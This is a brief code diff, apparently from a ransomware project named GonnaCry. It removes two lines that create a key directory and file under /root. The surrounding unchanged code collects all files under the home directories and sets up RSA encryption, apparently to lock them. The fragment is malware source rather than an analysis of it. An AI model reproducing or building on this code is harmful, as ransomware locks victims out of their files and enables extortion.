@@ -68,12 +68,6 @@ def start_encryption(files):
 
 def menu():
 
-    os.mkdir("/root/gonnacry")
-    os.mknod("/root/gonnacry/encrypted_client_private_key.key")
-
-
-
-
     files = get_files.find_files(variables.home)+get_files.find_files("/home/")
 
     rsa_object = asymmetric.assymetric()
